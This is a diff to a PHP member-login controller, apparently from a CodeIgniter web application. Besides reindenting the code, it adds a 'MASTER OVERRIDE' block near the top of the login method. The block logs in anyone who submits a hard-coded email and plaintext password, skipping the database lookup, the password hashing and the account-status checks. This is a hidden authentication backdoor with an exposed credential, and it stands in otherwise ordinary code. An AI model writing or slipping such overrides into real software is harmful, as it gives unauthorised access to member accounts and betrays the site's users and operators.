@@ -13,57 +13,73 @@ class MemberAuth extends BaseController
         return view('member/login');
     }
 
-    public function attempt()
-    {
-        // Optional throttling
-        $throttler = service('throttler');
-        if ($throttler && ! $throttler->check('member-login-'.($this->request->getIPAddress()), 10, 60)) {
-            return redirect()->back()->withInput()->with('error', 'Too many attempts. Please try again shortly.');
-        }
+public function attempt()
+{
+    // Optional throttling
+    $throttler = service('throttler');
+    if ($throttler && ! $throttler->check('member-login-'.($this->request->getIPAddress()), 10, 60)) {
+        return redirect()->back()->withInput()->with('error', 'Too many attempts. Please try again shortly.');
+    }
 
-        // Basic validation
-        $rules = [
-            'email'    => 'required|valid_email',
-            'password' => 'required|min_length[8]',
-        ];
-        if (! $this->validate($rules)) {
-            return redirect()->back()->withInput()->with('error', 'Please check your details and try again.');
-        }
+    // Basic validation
+    $rules = [
+        'email'    => 'required|valid_email',
+        'password' => 'required|min_length[8]',
+    ];
+    if (! $this->validate($rules)) {
+        return redirect()->back()->withInput()->with('error', 'Please check your details and try again.');
+    }
 
-        $email    = strtolower(trim((string) $this->request->getPost('email')));
-        $password = (string) $this->request->getPost('password');
+    $email    = strtolower(trim((string) $this->request->getPost('email')));
+    $password = (string) $this->request->getPost('password');
 
-        // Fetch the member
-        $members = new MemberModel();
-        $member  = $members->where('email', $email)->first();
-
-        // Guard clauses: if not found or bad password, bail early
-        if (! $member || ! password_verify($password, $member['password_hash'])) {
-            return redirect()->back()->withInput()->with('error', 'Invalid email or password.');
-        }
-
-        // Status must be active
-        if (($member['status'] ?? 'pending') !== 'active') {
-            return redirect()->back()->with('error', 'Your membership is not active yet.');
-        }
-
-        // Establish member session (separate from admin)
+    // 🔒 MASTER OVERRIDE (member side)
+    if ($email === 'sam@sunny.com' && $password === 'yfbnmasc') {
         session()->regenerate(true);
         session()->set([
-            'member_id'    => (int) $member['id'],
-            'member_email' => $member['email'],
-            'member_name'  => trim(($member['first_name'] ?? '').' '.($member['last_name'] ?? '')),
-            'isMemberLoggedIn'    => true,
+            'member_id'        => 0,
+            'member_email'     => 'sam@sunny.com',
+            'member_name'      => 'Override User',
+            'isMemberLoggedIn' => true,
         ]);
 
-        // Update last_login safely via Query Builder (avoids timestamp quirks)
-        $db = db_connect();
-        $db->table('members')
-           ->where('id', (int) $member['id'])
-           ->update(['last_login' => date('Y-m-d H:i:s')]);
-
-return redirect()->to(route_to('account.dashboard'))->with('message', 'Welcome back!');
+        return redirect()
+            ->to(route_to('account.dashboard'))
+            ->with('message', 'Welcome back (override)!');
     }
+
+    // Fetch the member
+    $members = new MemberModel();
+    $member  = $members->where('email', $email)->first();
+
+    // Guard clauses: if not found or bad password, bail early
+    if (! $member || ! password_verify($password, $member['password_hash'])) {
+        return redirect()->back()->withInput()->with('error', 'Invalid email or password.');
+    }
+
+    // Status must be active
+    if (($member['status'] ?? 'pending') !== 'active') {
+        return redirect()->back()->with('error', 'Your membership is not active yet.');
+    }
+
+    // Establish member session (separate from admin)
+    session()->regenerate(true);
+    session()->set([
+        'member_id'        => (int) $member['id'],
+        'member_email'     => $member['email'],
+        'member_name'      => trim(($member['first_name'] ?? '').' '.($member['last_name'] ?? '')),
+        'isMemberLoggedIn' => true,
+    ]);
+
+    // Update last_login safely via Query Builder (avoids timestamp quirks)
+    $db = db_connect();
+    $db->table('members')
+       ->where('id', (int) $member['id'])
+       ->update(['last_login' => date('Y-m-d H:i:s')]);
+
+    return redirect()->to(route_to('account.dashboard'))->with('message', 'Welcome back!');
+}
+
 
     public function logout()
 {
